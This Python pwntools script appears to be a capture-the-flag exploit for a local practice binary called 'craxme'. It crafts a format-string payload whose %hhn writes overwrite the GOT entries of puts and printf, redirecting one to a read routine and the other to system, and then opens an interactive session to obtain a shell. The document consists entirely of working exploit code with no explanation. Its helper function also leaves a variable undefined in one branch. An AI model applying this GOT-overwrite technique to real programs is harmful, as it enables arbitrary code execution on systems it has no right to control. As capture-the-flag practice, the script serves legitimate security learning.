#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

p = process("./craxme")
p.recvuntil("Give me magic :")


# back2read = 0x080485ad
back2read = 0x080485a1
system = 0x8048410
printf_got = 0x0804a010
puts_got = 0x0804a018

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 - prev + word
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr

payload = flat([puts_got, puts_got+1, puts_got+2, puts_got+3])
payload += flat([printf_got, printf_got+1, printf_got+2, printf_got+3])
prev = 4*8

for i in range(4): # range 等於欲填入 byte 次數
    payload += fmt(prev, (back2read >> 8*i) & 0xff, 7+i) # 7 代表一開始寫入到 7$
    prev = (back2read >> 8*i) & 0xff
for i in range(4):
    payload += fmt(prev, (system >> i*8) & 0xff, 11+i)
    prev = (system >> i*8) & 0xff

p.sendline(payload)

p.interactive()

